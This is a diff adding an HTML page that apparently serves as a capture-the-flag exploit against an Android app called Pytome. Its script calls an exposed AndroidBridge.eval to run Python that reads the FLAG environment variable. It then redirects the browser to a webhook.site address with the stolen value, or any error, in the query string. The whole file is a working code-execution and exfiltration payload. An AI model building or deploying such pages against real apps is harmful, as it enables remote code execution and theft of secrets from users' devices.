@@ -1,0 +1,37 @@
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Pytome</title>
+</head>
+<body>
+<pre id="status">Запуск...</pre>
+
+<script>
+const receiver = "https://webhook.site/603368f2-52be-49b3-812b-91e77b91c6c9";
+
+try {
+    if (!window.AndroidBridge) {
+        document.getElementById("status").textContent =
+            "AndroidBridge отсутствует — страница открыта не внутри Pytome";
+    } else {
+        const result = String(
+            window.AndroidBridge.eval(
+                "print(import('os').environ.get('FLAG', 'NO_FLAG'))"
+            )
+        ).trim();
+
+        document.getElementById("status").textContent = result;
+
+        location.replace(
+            receiver + "?flag=" + encodeURIComponent(result)
+        );
+    }
+} catch (e) {
+    location.replace(
+        receiver + "?error=" + encodeURIComponent(String(e))
+    );
+}
+</script>
+</body>
+</html>
